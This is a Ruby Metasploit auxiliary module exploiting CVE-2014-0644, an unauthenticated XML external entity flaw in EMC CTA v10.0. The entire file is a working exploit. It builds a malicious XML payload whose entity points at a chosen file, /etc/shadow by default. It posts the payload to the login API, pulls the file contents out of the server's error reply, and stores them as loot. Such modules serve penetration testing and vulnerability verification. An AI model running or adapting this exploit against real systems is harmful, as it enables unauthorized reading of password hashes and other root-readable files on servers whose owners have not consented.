##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read',
      'Description'    => %q{
      EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
      that allows an attacker to read arbitrary files from the file system
      with the permissions of the root user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-0644'],
          ['EDB', '32623']
        ],
      'DisclosureDate' => 'Mar 31 2014'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('TARGETURI', [ true, "Base directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
      ]
    )
  end

  def run

    doctype = Rex::Text.rand_text_alpha(6)
    element = Rex::Text.rand_text_alpha(6)
    entity = Rex::Text.rand_text_alpha(6)

    pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE #{doctype} [
<!ELEMENT #{element} ANY >
<!ENTITY #{entity} SYSTEM "file://#{datastore['FILEPATH']}" >]>
<Request>
<Username>root</Username>
<Password>&#{entity};</Password>
</Request>
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'login'),
      'method' => 'POST',
      'data' => pay
    })

    if !res or !res.body
      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way")
    end

    file = /For input string: "(.*)"/m.match(res.body)

    if !file or file.length < 2
      fail_with(Failure::UnexpectedReply, "File was unretrievable. Was it a binary file?")
    end

    file = file[1]

    path = store_loot('emc.file', 'text/plain', datastore['RHOST'], file, datastore['FILEPATH'])

    print_good("File saved to: " + path)
  end
end
